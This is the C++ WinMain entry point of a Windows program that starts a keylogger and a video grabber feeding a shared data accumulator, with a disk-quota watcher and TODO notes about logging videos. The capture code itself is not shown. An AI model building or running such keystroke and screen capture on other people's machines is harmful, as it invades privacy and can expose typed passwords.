#include <Windows.h>
#include "DataAccumulator.h"
#include "DiskQuotaWatcher.h"
#include "DataProvider.h"
#include "VideoGrabber.h"
#include "KeyLogger.h"

/** What next:
 *		0) Log videos to file
 *  	1) Debug Flush chunk!
 *		2) implement list of features and write separate functions for Init and Finalize
 **/
	
int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
					LPSTR lpCmdLine, int nCmdShow )
{
	DataAccumulator* dataAccumulator = new DataAccumulator();
	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
	//quotaKeeper->KeepLogsWithinQuota();
	VideoGrabber* videoGrabber = new VideoGrabber();
	KeyLogger* keyLogger = new KeyLogger();

	videoGrabber->SetDataAccumulator(dataAccumulator);
	videoGrabber->Init();
	keyLogger->SetDataAccumulator(dataAccumulator);
	keyLogger->Init();

	// IMportant! This message loop will be achieved ONLY if we disable KeyLogger!
	// This is because KeyLogger has its own message loop!
	MSG Msg; // save window messages here.

	if (!keyLogger->IsEnabled()) {
		while (GetMessage (&Msg, NULL, 0, 0))
		{
			TranslateMessage(&Msg); // Translate virtual-key messages to character messages
			DispatchMessage(&Msg); // Send message to WindowProcedure
		}
	}

	keyLogger->Finalize();
	videoGrabber->Finalize();

	delete videoGrabber;
	delete keyLogger;
	delete quotaKeeper;
	delete dataAccumulator;
	return Msg.wParam;
}
